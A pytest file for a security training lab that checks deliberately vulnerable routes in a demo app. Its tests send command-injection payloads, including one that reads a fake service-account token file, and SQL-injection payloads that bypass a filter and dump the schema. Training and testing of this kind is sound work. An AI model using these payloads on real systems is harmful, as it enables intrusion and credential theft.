"""Functional proof for Lab A4: when the insecure_demo module is ARMED and
INSECURE_MODE=1, the RCE and SQLi routes actually fire. This runs in-process
(no cluster, no curl) so it is deterministic and fast. The baseline app never
loads these routes -- see test_app.py::test_insecure_routes_off_by_default.
"""

import importlib
import sys
from pathlib import Path

import pytest

REPO = Path(__file__).resolve().parents[2]
# The vulnerable module lives under attack/ (outside app/) so the scanners stay
# green on the baseline. Put it on the path here to simulate "arming" it.
sys.path.insert(0, str(REPO / "attack" / "a4-app-injection"))
sys.path.insert(0, str(REPO / "app"))


@pytest.fixture()
def armed(tmp_path, monkeypatch):
    monkeypatch.setenv("DB_PATH", str(tmp_path / "notes.db"))
    monkeypatch.setenv("INSECURE_MODE", "1")
    import app as app_module

    importlib.reload(app_module)  # re-runs the guarded hook -> registers A4 routes
    client = app_module.app.test_client()
    client.post("/api/notes", json={"title": "alpha", "body": "one"})
    client.post("/api/notes", json={"title": "beta", "body": "two"})
    return client


def test_rce_runs_arbitrary_command(armed):
    # `;` ends the ping and starts the attacker's command.
    r = armed.get("/admin/diag", query_string={"host": ";echo PWNED_BY_A4"})
    assert r.status_code == 200
    assert "PWNED_BY_A4" in r.get_data(as_text=True)


def test_rce_reads_a_secret_file(armed, tmp_path):
    # Same mechanism the in-pod attack uses to read the ServiceAccount token:
    # the RCE cats an arbitrary file and the app hands the contents back.
    secret = tmp_path / "sa-token"
    secret.write_text("FAKE-SA-TOKEN-deadbeef")
    r = armed.get("/admin/diag", query_string={"host": f";cat {secret}"})
    assert "FAKE-SA-TOKEN-deadbeef" in r.get_data(as_text=True)


def test_sqli_bypasses_the_filter(armed):
    # A term that matches nothing normally...
    assert armed.get("/api/search", query_string={"q": "zzz"}).get_json() == []
    # ...but the injection returns every row.
    rows = armed.get("/api/search", query_string={"q": "' OR '1'='1"}).get_json()
    assert len(rows) >= 2


def test_sqli_leaks_the_schema(armed):
    payload = "' UNION SELECT 1, name, sql FROM sqlite_master WHERE type='table'-- "
    rows = armed.get("/api/search", query_string={"q": payload}).get_json()
    assert "notes" in [r["title"] for r in rows]
